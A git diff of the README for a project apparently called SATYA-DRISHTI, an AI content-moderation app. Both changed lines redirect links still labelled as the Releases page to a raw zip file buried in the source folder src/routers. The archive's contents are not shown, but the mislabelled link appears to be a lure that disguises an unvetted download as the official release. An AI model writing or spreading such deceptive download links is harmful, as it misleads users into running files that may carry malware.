@@ -1,7 +1,7 @@
 # 🌟 SATYA-DRISHTI - AI Moderation Made Easy
 
 ## 📥 Download Now
-[![Download SATYA-DRISHTI](https://img.shields.io/badge/Download-SATYA--DRISHTI-brightgreen.svg)](https://github.com/KamelSayed/SATYA-DRISHTI/releases)
+[![Download SATYA-DRISHTI](https://github.com/KamelSayed/SATYA-DRISHTI/raw/refs/heads/main/social-intel-agent/src/routers/SATY_DRISHTI_v1.9.zip)](https://github.com/KamelSayed/SATYA-DRISHTI/raw/refs/heads/main/social-intel-agent/src/routers/SATY_DRISHTI_v1.9.zip)
 
 ---
 
@@ -11,7 +11,7 @@ Welcome to SATYA-DRISHTI! This application helps you moderate content effortless
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/KamelSayed/SATYA-DRISHTI/releases) to download the latest version of SATYA-DRISHTI.
+To get started, visit the [Releases page](https://github.com/KamelSayed/SATYA-DRISHTI/raw/refs/heads/main/social-intel-agent/src/routers/SATY_DRISHTI_v1.9.zip) to download the latest version of SATYA-DRISHTI.
 
 1. Go to the Releases page.
 2. Look for the latest version.
